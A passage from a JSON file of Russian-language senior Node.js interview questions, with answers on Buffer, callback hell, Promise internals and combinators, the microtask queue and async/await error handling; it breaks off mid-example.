записан');\n});\n```\n\n**Buffer в сетевых операциях:**\n\n```javascript\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // data это Buffer\n    console.log(Buffer.isBuffer(data));  // true\n\n    // Работа с бинарными данными\n    const response = Buffer.from('HTTP/1.1 200 OK\\r\\n\\r\\nHello');\n    socket.write(response);\n  });\n});\n\nserver.listen(3000);\n```\n\n**Buffer vs TypedArray (ES6):**\n\n```javascript\n// TypedArray из ES6\nconst arr = new Uint8Array(5);\narr[0] = 72;\narr[1] = 101;\nconsole.log(arr);  // Uint8Array [ 72, 101, 0, 0, 0 ]\n\n// Buffer это подкласс Uint8Array\nconst buf = Buffer.from([72, 101]);\nconsole.log(buf instanceof Uint8Array);  // true\n\n// Но Buffer имеет дополнительные методы\nbuf.toString();  // ✅ Работает\narr.toString();  // ❌ Не работает как ожидается\n\n// Преобразование\nconst bufferFromTypedArray = Buffer.from(arr);\nconst typedArrayFromBuffer = new Uint8Array(buf);\n```\n\n**Безопасность Buffer:**\n\n```javascript\n// ❌ НЕБЕЗОПАСНО - может содержать старые данные из памяти\nconst unsafe = Buffer.allocUnsafe(10);\nconsole.log(unsafe);  // Может показать чувствительные данные!\n\n// ✅ БЕЗОПАСНО - заполнен нулями\nconst safe = Buffer.alloc(10);\nconsole.log(safe);  // <Buffer 00 00 00 00 00 00 00 00 00 00>\n\n// Если нужна производительность - заполните вручную\nconst fast = Buffer.allocUnsafe(10);\nfast.fill(0);  // Теперь безопасно\n```\n\n**Производительность:**\n\n```javascript\n// Buffer эффективен для работы с большими объемами данных\nconst bigBuffer = Buffer.alloc(1024 * 1024);  // 1MB\n\n// Работа с бинарными данными через Buffer НАМНОГО быстрее\n// чем через строки или массивы\n```\n\n**Практический пример - чтение изображения:**\n\n```javascript\nconst fs = require('fs');\n\nfs.readFile('image.jpg', (err, buffer) => {\n  // Проверка формата (JPEG начинается с FF D8 FF)\n  const isJPEG = buffer[0] === 0xFF &&\n                 buffer[1] === 0xD8 &&\n                 buffer[2] === 0xFF;\n\n  if (isJPEG) {\n    console.log('Это JPEG изображение');\n    console.log('Размер:', buffer.length, 'байт');\n  }\n\n  // Конвертация в base64 для передачи через HTTP\n  const base64 = buffer.toString('base64');\n  const dataUrl = `data:image/jpeg;base64,${base64}`;\n});\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 10,
          "question_number_in_chapter": 10,
          "question_chapter": 1,
          "question_title": "Что такое Callback Hell и как его избежать?",
          "answer_markdown": "\n**Ответ:**\n\n**Callback Hell** (Pyramid of Doom) - это ситуация когда у вас множество вложенных callback функций, что делает код трудночитаемым и поддерживаемым.\n\n**Пример Callback Hell:**\n\n```javascript\n// ❌ ПЛОХО - Callback Hell\nfs.readFile('file1.txt', (err, data1) => {\n  if (err) return console.error(err);\n\n  fs.readFile('file2.txt', (err, data2) => {\n    if (err) return console.error(err);\n\n    fs.readFile('file3.txt', (err, data3) => {\n      if (err) return console.error(err);\n\n      db.query('INSERT INTO ...', data1, (err, result1) => {\n        if (err) return console.error(err);\n\n        db.query('UPDATE ...', data2, (err, result2) => {\n          if (err) return console.error(err);\n\n          db.query('DELETE ...', data3, (err, result3) => {\n            if (err) return console.error(err);\n\n            console.log('Все готово!');\n            // Код ушел далеко вправо →→→\n          });\n        });\n      });\n    });\n  });\n});\n```\n\n**Проблемы Callback Hell:**\n\n1. **Читаемость** - код сложно читать и понимать\n2. **Поддержка** - сложно добавлять новую логику\n3. **Обработка ошибок** - нужно проверять ошибки в каждом callback\n4. **Тестирование** - сложно тестировать\n5. **Отладка** - сложно найти ошибки\n\n**Решение 1: Модуляризация (Named Functions)**\n\n```javascript\n// ✅ ЛУЧШЕ - именованные функции\nfunction step1(callback) {\n  fs.readFile('file1.txt', (err, data) => {\n    if (err) return callback(err);\n    callback(null, data);\n  });\n}\n\nfunction step2(data1, callback) {\n  fs.readFile('file2.txt', (err, data) => {\n    if (err) return callback(err);\n    callback(null, data1, data);\n  });\n}\n\nfunction step3(data1, data2, callback) {\n  fs.readFile('file3.txt', (err, data) => {\n    if (err) return callback(err);\n    callback(null, data1, data2, data);\n  });\n}\n\n// Использование\nstep1((err, data1) => {\n  if (err) return console.error(err);\n\n  step2(data1, (err, data1, data2) => {\n    if (err) return console.error(err);\n\n    step3(data1, data2, (err, data1, data2, data3) => {\n      if (err) return console.error(err);\n\n      console.log('Все готово!');\n    });\n  });\n});\n\n// Все еще не идеально, но лучше\n```\n\n**Решение 2: Async библиотека**\n\n```javascript\nconst async = require('async');\n\n// ✅ ХОРОШО - async.waterfall\nasync.waterfall([\n  // Шаг 1\n  (callback) => {\n    fs.readFile('file1.txt', callback);\n  },\n  // Шаг 2\n  (data1, callback) => {\n    fs.readFile('file2.txt', (err, data2) => {\n      callback(err, data1, data2);\n    });\n  },\n  // Шаг 3\n  (data1, data2, callback) => {\n    fs.readFile('file3.txt', (err, data3) => {\n      callback(err, data1, data2, data3);\n    });\n  }\n], (err, data1, data2, data3) => {\n  if (err) return console.error(err);\n  console.log('Все готово!');\n});\n\n// Параллельное выполнение\nasync.parallel([\n  (callback) => fs.readFile('file1.txt', callback),\n  (callback) => fs.readFile('file2.txt', callback),\n  (callback) => fs.readFile('file3.txt', callback)\n], (err, results) => {\n  if (err) return console.error(err);\n  const [data1, data2, data3] = results;\n  console.log('Все файлы прочитаны');\n});\n```\n\n**Решение 3: Promises (ES6)**\n\n```javascript\nconst fs = require('fs').promises;\n\n// ✅ ОТЛИЧНО - Promises\nfs.readFile('file1.txt')\n  .then(data1 => {\n    return fs.readFile('file2.txt').then(data2 => [data1, data2]);\n  })\n  .then(([data1, data2]) => {\n    return fs.readFile('file3.txt').then(data3 => [data1, data2, data3]);\n  })\n  .then(([data1, data2, data3]) => {\n    console.log('Все готово!');\n  })\n  .catch(err => {\n    console.error(err);\n  });\n\n// Еще лучше с Promise.all для параллельного выполнения\nPromise.all([\n  fs.readFile('file1.txt'),\n  fs.readFile('file2.txt'),\n  fs.readFile('file3.txt')\n])\n.then(([data1, data2, data3]) => {\n  console.log('Все файлы прочитаны');\n})\n.catch(console.error);\n```\n\n**Решение 4: Async/Await (ES2017) - ЛУЧШЕЕ**\n\n```javascript\nconst fs = require('fs').promises;\n\n// ✅ ИДЕАЛЬНО - Async/Await\nasync function processFiles() {\n  try {\n    const data1 = await fs.readFile('file1.txt');\n    const data2 = await fs.readFile('file2.txt');\n    const data3 = await fs.readFile('file3.txt');\n\n    console.log('Все готово!');\n  } catch (err) {\n    console.error(err);\n  }\n}\n\nprocessFiles();\n\n// Параллельное выполнение с await\nasync function processFilesParallel() {\n  try {\n    const [data1, data2, data3] = await Promise.all([\n      fs.readFile('file1.txt'),\n      fs.readFile('file2.txt'),\n      fs.readFile('file3.txt')\n    ]);\n\n    console.log('Все файлы прочитаны');\n  } catch (err) {\n    console.error(err);\n  }\n}\n```\n\n**Сравнение подходов:**\n\n| Подход | Читаемость | Обработка ошибок | Параллелизм | Поддержка |\n|--------|-----------|-----------------|------------|-----------|\n| Callbacks | ❌ Плохо | ❌ Сложно | ⚠️ Возможно | ❌ Сложно |\n| Named Functions | ⚠️ Средне | ⚠️ Средне | ⚠️ Возможно | ⚠️ Средне |\n| Async lib | ✅ Хорошо | ✅ Хорошо | ✅ Легко | ✅ Хорошо |\n| Promises | ✅ Хорошо | ✅ Хорошо | ✅ Легко | ✅ Хорошо |\n| Async/Await | ✅✅ Отлично | ✅✅ Отлично | ✅✅ Легко | ✅✅ Отлично |\n\n**Практический пример - рефакторинг:**\n\n```javascript\n// БЫЛО (Callback Hell)\napp.post('/register', (req, res) => {\n  validateInput(req.body, (err, validData) => {\n    if (err) return res.status(400).json(err);\n\n    checkUserExists(validData.email, (err, exists) => {\n      if (err) return res.status(500).json(err);\n      if (exists) return res.status(409).json({ error: 'User exists' });\n\n      hashPassword(validData.password, (err, hash) => {\n        if (err) return res.status(500).json(err);\n\n        createUser(validData.email, hash, (err, user) => {\n          if (err) return res.status(500).json(err);\n\n          sendWelcomeEmail(user.email, (err) => {\n            if (err) console.error('Email failed', err);\n\n            res.status(201).json(user);\n          });\n        });\n      });\n    });\n  });\n});\n\n// СТАЛО (Async/Await)\napp.post('/register', async (req, res) => {\n  try {\n    const validData = await validateInput(req.body);\n\n    const exists = await checkUserExists(validData.email);\n    if (exists) {\n      return res.status(409).json({ error: 'User exists' });\n    }\n\n    const hash = await hashPassword(validData.password);\n    const user = await createUser(validData.email, hash);\n\n    // Email отправляем без await (fire and forget)\n    sendWelcomeEmail(user.email).catch(err =>\n      console.error('Email failed', err)\n    );\n\n    res.status(201).json(user);\n  } catch (err) {\n    console.error(err);\n    res.status(500).json({ error: 'Server error' });\n  }\n});\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        }
      ]
    },
    {
      "chapter_number": 2,
      "chapter_title": "Event Loop & Async Programming",
      "questions_count": 10,
      "questions": [
        {
          "question_number": 11,
          "question_number_in_chapter": 1,
          "question_chapter": 2,
          "question_title": "Как работают Promises внутри? Какие у них состояния?",
          "answer_markdown": "\n**Ответ:**\n\n**Promise** - это объект представляющий результат асинхронной операции, который может быть доступен сейчас, в будущем или никогда.\n\n**Три состояния Promise:**\n\n```javascript\n// 1. PENDING (ожидание) - начальное состояние\nconst promise = new Promise((resolve, reject) => {\n  // Promise в состоянии PENDING\n  console.log('Promise создан');\n});\n\n// 2. FULFILLED (выполнен успешно)\nconst fulfilled = Promise.resolve('Success');\nfulfilled.then(value => console.log(value));  // 'Success'\n\n// 3. REJECTED (отклонен)\nconst rejected = Promise.reject('Error');\nrejected.catch(error => console.error(error));  // 'Error'\n```\n\n**Диаграмма состояний:**\n\n```\n       ┌─────────────┐\n       │   PENDING   │ ← Начальное состояние\n       └──────┬──────┘\n              │\n       ┌──────┴──────┐\n       │             │\n       ↓             ↓\n┌──────────┐   ┌──────────┐\n│FULFILLED │   │ REJECTED │ ← Финальные состояния\n│(resolved)│   │(rejected)│    (нельзя изменить)\n└──────────┘   └──────────┘\n```\n\n**Внутреннее устройство Promise:**\n\n```javascript\n// Упрощенная реализация Promise\nclass MyPromise {\n  constructor(executor) {\n    this.state = 'PENDING';\n    this.value = undefined;\n    this.handlers = [];\n\n    const resolve = (value) => {\n      if (this.state !== 'PENDING') return;\n\n      this.state = 'FULFILLED';\n      this.value = value;\n      this.handlers.forEach(handler => this._callHandler(handler));\n    };\n\n    const reject = (error) => {\n      if (this.state !== 'PENDING') return;\n\n      this.state = 'REJECTED';\n      this.value = error;\n      this.handlers.forEach(handler => this._callHandler(handler));\n    };\n\n    try {\n      executor(resolve, reject);\n    } catch (err) {\n      reject(err);\n    }\n  }\n\n  then(onFulfilled, onRejected) {\n    return new MyPromise((resolve, reject) => {\n      this.handlers.push({\n        onFulfilled,\n        onRejected,\n        resolve,\n        reject\n      });\n\n      if (this.state !== 'PENDING') {\n        this._callHandler(this.handlers[this.handlers.length - 1]);\n      }\n    });\n  }\n\n  catch(onRejected) {\n    return this.then(null, onRejected);\n  }\n\n  _callHandler(handler) {\n    if (this.state === 'FULFILLED') {\n      if (handler.onFulfilled) {\n        try {\n          const result = handler.onFulfilled(this.value);\n          handler.resolve(result);\n        } catch (err) {\n          handler.reject(err);\n        }\n      } else {\n        handler.resolve(this.value);\n      }\n    }\n\n    if (this.state === 'REJECTED') {\n      if (handler.onRejected) {\n        try {\n          const result = handler.onRejected(this.value);\n          handler.resolve(result);\n        } catch (err) {\n          handler.reject(err);\n        }\n      } else {\n        handler.reject(this.value);\n      }\n    }\n  }\n}\n\n// Использование\nconst p = new MyPromise((resolve, reject) => {\n  setTimeout(() => resolve('Done!'), 1000);\n});\n\np.then(value => console.log(value));  // 'Done!' через 1 секунду\n```\n\n**Promise Chaining:**\n\n```javascript\n// Promises можно чейнить\nfetch('/api/user/1')\n  .then(response => response.json())      // Promise<User>\n  .then(user => fetch(`/api/posts/${user.id}`))  // Promise<Response>\n  .then(response => response.json())      // Promise<Post[]>\n  .then(posts => console.log(posts))      // Post[]\n  .catch(error => console.error(error));  // Обработка ВСЕХ ошибок\n```\n\n**Важные особенности:**\n\n```javascript\n// 1. Promise выполняется НЕМЕДЛЕННО\nconst p = new Promise((resolve) => {\n  console.log('Выполняется СРАЗУ');  // Выполнится немедленно\n  resolve();\n});\nconsole.log('После создания Promise');\n// Вывод:\n// Выполняется СРАЗУ\n// После создания Promise\n\n// 2. then/catch всегда асинхронны (microtask)\nPromise.resolve().then(() => console.log('Promise'));\nconsole.log('Sync');\n// Вывод:\n// Sync\n// Promise\n\n// 3. Состояние нельзя изменить дважды\nconst p2 = new Promise((resolve, reject) => {\n  resolve('First');\n  resolve('Second');  // Игнорируется\n  reject('Error');    // Игнорируется\n});\np2.then(value => console.log(value));  // 'First'\n\n// 4. Ошибки в executor автоматически становятся rejection\nconst p3 = new Promise(() => {\n  throw new Error('Boom!');  // Автоматически reject\n});\np3.catch(err => console.error(err.message));  // 'Boom!'\n\n// 5. Неперехваченные rejections\nconst p4 = Promise.reject('Error');\n// ⚠️ Если не добавить .catch(), получим UnhandledPromiseRejection\n\n// Правильно:\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled Rejection:', reason);\n});\n```\n\n**Promise vs Callback:**\n\n```javascript\n// Callback\nfunction fetchUserCallback(id, callback) {\n  db.query('SELECT * FROM users WHERE id = ?', [id], (err, user) => {\n    if (err) return callback(err);\n    callback(null, user);\n  });\n}\n\nfetchUserCallback(1, (err, user) => {\n  if (err) return console.error(err);\n  console.log(user);\n});\n\n// Promise\nfunction fetchUserPromise(id) {\n  return new Promise((resolve, reject) => {\n    db.query('SELECT * FROM users WHERE id = ?', [id], (err, user) => {\n      if (err) return reject(err);\n      resolve(user);\n    });\n  });\n}\n\nfetchUserPromise(1)\n  .then(user => console.log(user))\n  .catch(err => console.error(err));\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 12,
          "question_number_in_chapter": 2,
          "question_chapter": 2,
          "question_title": "В чем разница между Promise.all(), Promise.race(), Promise.allSettled() и Promise.any()?",
          "answer_markdown": "\n**Ответ:**\n\nВсе эти методы работают с массивом Promises, но ведут себя по-разному:\n\n**1. Promise.all() - ждет ВСЕ или первый reject:**\n\n```javascript\n// ✅ Успех - все fulfilled\nPromise.all([\n  Promise.resolve(1),\n  Promise.resolve(2),\n  Promise.resolve(3)\n])\n.then(results => console.log(results));  // [1, 2, 3]\n\n// ❌ Ошибка - хотя бы один rejected\nPromise.all([\n  Promise.resolve(1),\n  Promise.reject('Error'),  // Этот reject прервет все\n  Promise.resolve(3)\n])\n.catch(err => console.error(err));  // 'Error'\n\n// Практический пример\nasync function loadDashboard() {\n  try {\n    const [user, posts, comments] = await Promise.all([\n      fetchUser(),\n      fetchPosts(),\n      fetchComments()\n    ]);\n\n    return { user, posts, comments };\n  } catch (err) {\n    // Если ЛЮБОЙ запрос упадет - весь Promise.all отклонится\n    console.error('Dashboard load failed:', err);\n  }\n}\n```\n\n**2. Promise.race() - первый завершившийся (fulfilled или rejected):**\n\n```javascript\n// Выигрывает самый быстрый\nPromise.race([\n  new Promise(resolve => setTimeout(() => resolve('Slow'), 1000)),\n  new Promise(resolve => setTimeout(() => resolve('Fast'), 100))\n])\n.then(result => console.log(result));  // 'Fast'\n\n// Практический пример - таймаут\nfunction fetchWithTimeout(url, timeout) {\n  return Promise.race([\n    fetch(url),\n    new Promise((_, reject) =>\n      setTimeout(() => reject(new Error('Timeout')), timeout)\n    )\n  ]);\n}\n\nfetchWithTimeout('https://api.example.com/slow', 3000)\n  .then(response => response.json())\n  .catch(err => {\n    if (err.message === 'Timeout') {\n      console.error('Request took too long');\n    }\n  });\n\n// Первый reject тоже \"выигрывает\"\nPromise.race([\n  new Promise((_, reject) => setTimeout(() => reject('Error'), 100)),\n  new Promise(resolve => setTimeout(() => resolve('Success'), 200))\n])\n.catch(err => console.error(err));  // 'Error'\n```\n\n**3. Promise.allSettled() - ждет ВСЕ (ES2020):**\n\n```javascript\n// Всегда выполняется успешно, даже если есть reject\nPromise.allSettled([\n  Promise.resolve(1),\n  Promise.reject('Error'),\n  Promise.resolve(3)\n])\n.then(results => console.log(results));\n// [\n//   { status: 'fulfilled', value: 1 },\n//   { status: 'rejected', reason: 'Error' },\n//   { status: 'fulfilled', value: 3 }\n// ]\n\n// Практический пример - загрузка с нескольких источников\nasync function loadFromMultipleSources() {\n  const results = await Promise.allSettled([\n    fetch('https://api1.example.com/data'),\n    fetch('https://api2.example.com/data'),\n    fetch('https://api3.example.com/data')\n  ]);\n\n  const successful = results.filter(r => r.status === 'fulfilled');\n  const failed = results.filter(r => r.status === 'rejected');\n\n  console.log(`Loaded: ${successful.length}, Failed: ${failed.length}`);\n\n  return successful.map(r => r.value);\n}\n```\n\n**4. Promise.any() - первый fulfilled (ES2021):**\n\n```javascript\n// Выигрывает первый успешный\nPromise.any([\n  Promise.reject('Error 1'),\n  Promise.resolve('Success 1'),  // Этот выиграет\n  Promise.resolve('Success 2')\n])\n.then(result => console.log(result));  // 'Success 1'\n\n// Все rejected - AggregateError\nPromise.any([\n  Promise.reject('Error 1'),\n  Promise.reject('Error 2'),\n  Promise.reject('Error 3')\n])\n.catch(err => {\n  console.log(err instanceof AggregateError);  // true\n  console.log(err.errors);  // ['Error 1', 'Error 2', 'Error 3']\n});\n\n// Практический пример - запрос к нескольким зеркалам\nasync function fetchFromMirrors(path) {\n  const mirrors = [\n    'https://mirror1.example.com',\n    'https://mirror2.example.com',\n    'https://mirror3.example.com'\n  ];\n\n  try {\n    const response = await Promise.any(\n      mirrors.map(mirror => fetch(`${mirror}${path}`))\n    );\n    return response.json();\n  } catch (err) {\n    console.error('All mirrors failed:', err.errors);\n    throw new Error('Service unavailable');\n  }\n}\n```\n\n**Сравнительная таблица:**\n\n| Метод | Возвращает когда | Reject когда | Use Case |\n|-------|-----------------|--------------|----------|\n| **Promise.all()** | Все fulfilled | Первый reject | Все запросы обязательны |\n| **Promise.race()** | Первый settled (любой) | Первый reject | Таймауты, fastest wins |\n| **Promise.allSettled()** | Все settled | Никогда | Нужны все результаты |\n| **Promise.any()** | Первый fulfilled | Все rejected | Зеркала, fallbacks |\n\n**Практический пример - комбинирование:**\n\n```javascript\n// Загрузка с таймаутом и fallback\nasync function smartFetch(url) {\n  // 1. Promise.race для таймаута\n  const fetchWithTimeout = Promise.race([\n    fetch(url),\n    new Promise((_, reject) =>\n      setTimeout(() => reject(new Error('Timeout')), 5000)\n    )\n  ]);\n\n  // 2. Promise.any для fallback к зеркалам\n  try {\n    return await fetchWithTimeout;\n  } catch (err) {\n    console.warn('Primary failed, trying mirrors...');\n    return Promise.any([\n      fetch(`https://mirror1.com${url}`),\n      fetch(`https://mirror2.com${url}`)\n    ]);\n  }\n}\n\n// Загрузка критических и некритических данных\nasync function loadPageData() {\n  // Критические данные - должны загрузиться все\n  const critical = await Promise.all([\n    fetchUser(),\n    fetchConfig()\n  ]);\n\n  // Некритические - можем продолжить если некоторые упадут\n  const optional = await Promise.allSettled([\n    fetchRecommendations(),\n    fetchAnalytics(),\n    fetchAds()\n  ]);\n\n  return {\n    user: critical[0],\n    config: critical[1],\n    recommendations: optional[0].status === 'fulfilled' ? optional[0].value : [],\n    analytics: optional[1].status === 'fulfilled' ? optional[1].value : null,\n    ads: optional[2].status === 'fulfilled' ? optional[2].value : []\n  };\n}\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 13,
          "question_number_in_chapter": 3,
          "question_chapter": 2,
          "question_title": "Что такое Microtasks и Macrotasks? В чем разница?",
          "answer_markdown": "\n**Ответ:**\n\nEvent Loop в Node.js имеет **два типа очередей задач**: Microtasks (микрозадачи) и Macrotasks (макрозадачи).\n\n**Macrotasks (Макрозадачи):**\n\nВыполняются в основных фазах Event Loop:\n- `setTimeout()`\n- `setInterval()`\n- `setImmediate()`\n- I/O операции\n- UI rendering (в браузере)\n\n**Microtasks (Микрозадачи):**\n\nВыполняются МЕЖДУ фазами Event Loop и имеют **приоритет**:\n- `Promise.then()`, `Promise.catch()`, `Promise.finally()`\n- `process.nextTick()` (Node.js, наивысший приоритет)\n- `queueMicrotask()`\n- `MutationObserver` (в браузере)\n\n**Порядок выполнения:**\n\n```\n1. Выполнить текущий синхронный код\n2. Выполнить ВСЕ process.nextTick callbacks\n3. Выполнить ВСЕ Promise microtasks\n4. Перейти к следующей фазе Event Loop (macrotask)\n5. Повторить с шага 2\n```\n\n**Пример 1 - Базовый порядок:**\n\n```javascript\nconsole.log('1: Sync');\n\nsetTimeout(() => console.log('2: setTimeout'), 0);\n\nPromise.resolve().then(() => console.log('3: Promise'));\n\nprocess.nextTick(() => console.log('4: nextTick'));\n\nconsole.log('5: Sync');\n\n// Результат:\n// 1: Sync\n// 5: Sync\n// 4: nextTick       ← Microtask (высший приоритет)\n// 3: Promise        ← Microtask\n// 2: setTimeout     ← Macrotask\n```\n\n**Пример 2 - Вложенные callbacks:**\n\n```javascript\nsetTimeout(() => {\n  console.log('setTimeout 1');\n\n  Promise.resolve().then(() => {\n    console.log('Promise in setTimeout 1');\n  });\n\n  process.nextTick(() => {\n    console.log('nextTick in setTimeout 1');\n  });\n}, 0);\n\nsetTimeout(() => {\n  console.log('setTimeout 2');\n}, 0);\n\n// Результат:\n// setTimeout 1\n// nextTick in setTimeout 1    ← Microtask выполнится до следующего macrotask\n// Promise in setTimeout 1     ← Microtask\n// setTimeout 2                ← Следующий macrotask\n```\n\n**Пример 3 - Цепочка Promises vs setTimeout:**\n\n```javascript\n// Promises (Microtasks) - выполнятся подряд\nPromise.resolve()\n  .then(() => console.log('Promise 1'))\n  .then(() => console.log('Promise 2'))\n  .then(() => console.log('Promise 3'));\n\n// setTimeout (Macrotasks) - между ними могут вклиниться другие задачи\nsetTimeout(() => {\n  console.log('Timeout 1');\n  setTimeout(() => console.log('Timeout 2'), 0);\n  setTimeout(() => console.log('Timeout 3'), 0);\n}, 0);\n\n// Результат:\n// Promise 1\n// Promise 2\n// Promise 3\n// Timeout 1\n// Timeout 2  или Timeout 3 (порядок может варьироваться)\n// Timeout 3  или Timeout 2\n```\n\n**Диаграмма Event Loop с Microtasks:**\n\n```\n┌───────────────────────────┐\n│   Текущий Call Stack      │\n└──────────┬────────────────┘\n           │\n           ↓\n┌───────────────────────────┐\n│  process.nextTick queue   │ ← Наивысший приоритет\n└──────────┬────────────────┘\n           │\n           ↓\n┌───────────────────────────┐\n│  Promise Microtask queue  │ ← Высокий приоритет\n└──────────┬────────────────┘\n           │\n           ↓\n┌───────────────────────────┐\n│   Event Loop Phase        │ ← Macrotasks\n│   (timers/poll/check)     │\n└──────────┬────────────────┘\n           │\n           └──→ Повторить\n```\n\n**Проблема - бесконечный цикл Microtasks:**\n\n```javascript\n// ❌ ПЛОХО - блокирует Event Loop!\nfunction recursiveMicrotask() {\n  Promise.resolve().then(() => {\n    console.log('Microtask');\n    recursiveMicrotask();  // Создает новую microtask\n  });\n}\n\nrecursiveMicrotask();\n\n// Event Loop заблокирован!\n// Macrotasks (setTimeout, I/O) никогда не выполнятся\n\n// ✅ ХОРОШО - использовать setImmediate\nfunction recursiveMacrotask() {\n  setImmediate(() => {\n    console.log('Macrotask');\n    recursiveMacrotask();\n  });\n}\n\nrecursiveMacrotask();\n// Event Loop продолжает работать между вызовами\n```\n\n**Практический пример - оптимизация батчинга:**\n\n```javascript\n// Использование Microtasks для батчинга обновлений\nclass StateManager {\n  constructor() {\n    this.state = {};\n    this.listeners = [];\n    this.pendingUpdate = false;\n  }\n\n  setState(updates) {\n    Object.assign(this.state, updates);\n\n    // Батчим обновления через Microtask\n    if (!this.pendingUpdate) {\n      this.pendingUpdate = true;\n\n      // Microtask - выполнится до следующего macrotask\n      Promise.resolve().then(() => {\n        this.pendingUpdate = false;\n        this.notifyListeners();\n      });\n    }\n  }\n\n  notifyListeners() {\n    this.listeners.forEach(listener => listener(this.state));\n  }\n}\n\n// Использование\nconst manager = new StateManager();\n\nmanager.setState({ a: 1 });\nmanager.setState({ b: 2 });  // Батчится с предыдущим\nmanager.setState({ c: 3 });  // Батчится с предыдущими\n\n// Listeners вызовутся только ОДИН раз с финальным состоянием\n// { a: 1, b: 2, c: 3 }\n```\n\n**queueMicrotask() - явное добавление в очередь:**\n\n```javascript\n// queueMicrotask() - стандартный способ добавить microtask\nqueueMicrotask(() => {\n  console.log('Microtask 1');\n});\n\nPromise.resolve().then(() => {\n  console.log('Microtask 2');\n});\n\n// Оба выполнятся в порядке добавления\n// Microtask 1\n// Microtask 2\n```\n\n**Когда использовать Microtasks vs Macrotasks:**\n\n**Microtasks (Promise, process.nextTick):**\n- Критичная логика которая должна выполниться до следующего рендера\n- Батчинг обновлений\n- Валидация данных после синхронного кода\n- Обработка ошибок\n\n**Macrotasks (setTimeout, setImmediate):**\n- Тяжелые вычисления (разбить на части)\n- Отложенные некритичные операции\n- Анимации (в браузере)\n- Периодические задачи\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 14,
          "question_number_in_chapter": 4,
          "question_chapter": 2,
          "question_title": "Как правильно обрабатывать ошибки в async/await коде?",
          "answer_markdown": "\n**Ответ:**\n\nОбработка ошибок в async/await критична для стабильности приложения.\n\n**1. Базовая обработка - try/catch:**\n\n```javascript\nasync function fetchUser(id) {\n  try {\n    const response = await fetch(`/api/users/${id}`);\n    const user = await response.json();\n    return user;\n  } catch (error) {\n    console.error('Error fetching user:', error);\n    throw error;  // Пробрасываем дальше\n  }\n}\n\n// Использование\ntry {\n  const user = await fetchUser(1);\n  console.log(user);\n} catch (error) {\n  console.error('Failed to load user');\n}\n```\n\n**2. Множественные операции:**\n\n```javascript\nasync function loadDashboard() {\n  try {\n    // Если ЛЮБАЯ операция упадет - попадем в catch\n    const user = await fetchUser();\n    const posts = await fetchPosts(user.id);\n    const comments = await fetchComments(posts);\n\n    return { user, posts, comments };\n  } catch (error) {\n    // Обработка ВСЕХ ошибок в одном месте\n    console.error('Dashboard load failed:', error);\n\n    // Можем вернуть fallback данные\n    return { user: null, posts: [], comments: [] };\n  }\n}\n```\n\n**3. Частичная обработка ошибок:**\n\n```javascript\nasync function loadPageData() {\n  let user, posts, ads;\n\n  // Критичные данные - должны загрузиться\n  try {\n    user = await fetchUser();\n    posts = await fetchPosts();\n  } catch (error) {\n    console.error('Critical data failed:', error);\n    throw error;  // Не можем продолжить без критичных данных\n  }\n\n  // Некритичные данные - можем продолжить без них\n  try {\n    ads = await fetchAds();\n  } catch (error) {\n    console.warn('Ads failed to load:', error);\n    ads = [];  // Fallback\n  }\n\n  return { user, posts, ads };\n}\n```\n\n**4. Promise.allSettled для параллельных операций:**\n\n```javascript\nasync function loadMultipleResources() {\n  const results = await Promise.allSettled([\n    fetchUser(),\n    fetchPosts(),\n    fetchComments(),\n    fetchAds()\n  ]);\n\n  // Обработка каждого результата индивидуально\n  const [userResult, postsResult, commentsResult, adsResult] = results;\n\n  return {\n    user: userResult.status === 'fulfilled' ? userResult.value : null,\n    posts: postsResult.status === 'fulfilled' ? postsResult.value : [],\n    comments: commentsResult.status === 'fulfilled' ? commentsResult.value : [],\n    ads: adsResult.status === 'fulfilled' ? adsResult.value : []\n  };\n}\n```\n\n**5. Кастомные классы ошибок:**\n\n```javascript\n// Определяем типы ошибок\nclass ValidationError extends Error {\n  constructor(message) {\n    super(message);\n    this.name = 'ValidationError';\n    this.statusCode = 400;\n  }\n}\n\nclass NotFoundError extends Error {\n  constructor(message) {\n    super(message);\n    this.name = 'NotFoundError';\n    this.statusCode = 404;\n  }\n}\n\nclass DatabaseError extends Error {\n  constructor(message) {\n    super(message);\n    this.name = 'DatabaseError';\n    this.statusCode = 500;\n  }\n}\n\n// Использование\nasync function getUser(id) {\n  if (!id) {\n    throw new ValidationError('User ID is required');\n  }\n\n  try {\n    const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);\n\n    if (!user) {\n      throw new NotFoundError(`User ${id} not found`);\n    }\n\n    return user;\n  } catch (error) {\n    if (error instanceof ValidationError || error instanceof NotFoundError) {\n      throw error;  // Пробрасываем бизнес-ошибки\n    }\n\n    // Оборачиваем технические ошибки\n    throw new DatabaseError(`Failed to fetch user: ${error.message}`);\n  }\n}\n\n// Обработка в Express middleware\napp.get('/users/:id', async (req, res, next) => {\n  try {\n    const user = await getUser(req.params.id);\n    res.json(user);\n  } catch (error) {\n    if (error instanceof ValidationError) {\n      return res.status(400).json({ error: error.message });\n    }\n    if (error instanceof NotFoundError) {\n      return res.status(404).json({ error: error.message });\n    }\n    if (error instanceof DatabaseError) {\n      return res.status(500).json({ error: 'Internal server error' });\n    }\n\n    next(error);  // Неизвестные ошибки в error handler\n  }\n});\n```\n\n**6. Retry логика:**\n\n```javascript\nasync function fetchWithRetry(url, maxRetries = 3) {\n  for (let i = 0; i < maxRetries; i++) {\n    try {\n      const response = await fetch(url);\n\n      if (!response.ok) {\n        throw new Error(`HTTP ${response.status}`);\n      }\n\n      return await response.json();\n    } catch (error) {\n      const isLastAttempt = i === maxRetries - 1;\n\n      if (isLastAttempt) {\n        throw error;  // Последняя попытка - выбрасываем ошибку\n      }\n\n      console.warn(`Attempt ${i + 1} failed, retrying...`);\n\n      // Exponential backoff\n      await new Promise(resolve =>\n        setTimeout(resolve, Math.pow(2, i) * 1000)\n      );\n    }\n  }\n}\n\n// Использование\ntry {\n  const data = await fetchWithRetry('https://api.example.com/data');\n  console.log(data);\n} catch (error) {\n  console.error('All retries failed:', error);\n}\n```\n\n**7. Timeout обертка:**\n\n```javascript\nfunction withTimeout(promise, timeoutMs) {\n  return Promise.race([\n    